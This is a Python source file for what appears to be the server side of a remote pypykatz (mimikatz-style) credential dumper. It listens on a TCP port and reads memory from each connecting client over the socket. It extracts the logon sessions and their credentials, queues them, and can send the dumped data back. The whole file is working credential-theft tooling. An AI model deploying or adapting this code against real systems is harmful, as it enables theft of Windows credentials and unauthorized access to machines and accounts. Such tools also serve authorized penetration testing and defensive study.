
from pypykatz_server.protocol.command import *
from pypykatz_server.reader.remotereader import *
from pypykatz_server.transport.sockettransport import *
from pypykatz.commons.common import *
from pypykatz.pypykatz import pypykatz
import json
import logging
import traceback
from threading import Thread
import socket

logging.basicConfig(level=10)

class ThreadedPYPYSocketServer:
	def __init__(self, ip, port, resultQ, send_results = False):
		self.listen_ip = ip
		self.listen_port = port
		self.resultQ = resultQ
		self.send_results = send_results
		
		self.ssock = None
		
	def setup(self):
		self.ssock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.ssock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.ssock.bind((self.listen_ip, self.listen_port))
		self.ssock.listen(100)
		
	def run(self):
		self.setup()
		print('[+] Waiting for clients...')
		while True:
			clientsock, addr = self.ssock.accept()
			print('[+] Client connected from %s:%s' % addr)
			
			handler = Thread(target=self.handle, args=[clientsock, addr])
			handler.start()
		

	def handle(self, soc, addr):
		peer_addr = '%s:%s' % addr
		mimi = None
		transport = SocketTransport(soc)
		reader = RemoteReader(transport)
		try:
			print('[+] Handling client...')
			sysinfo = reader.setup()
			mimi = pypykatz(reader, sysinfo)
			mimi.start()
			
			self.resultQ.put((mimi, peer_addr))
			
			cmd = PYPYCMD()
			cmd.cmdtype = PYPYCMDType.END
			if self.send_results == True:
				data = ""
				for luid in mimi.logon_sessions:
					data += str(mimi.logon_sessions[luid])
			
				cmd.params.append(data.encode())
			transport.send(cmd)
			print('[+] Client finished!')
			
		except Exception as e:
			
			traceback.print_exc()
			if mimi and len(mimi.logon_sessions) > 0:
				self.resultQ.put((mimi, peer_addr))
				
			try:
				cmd = PYPYCMD()
				cmd.cmdtype = PYPYCMDType.END
				transport.send(cmd)
			except:
				pass
				
			
		return
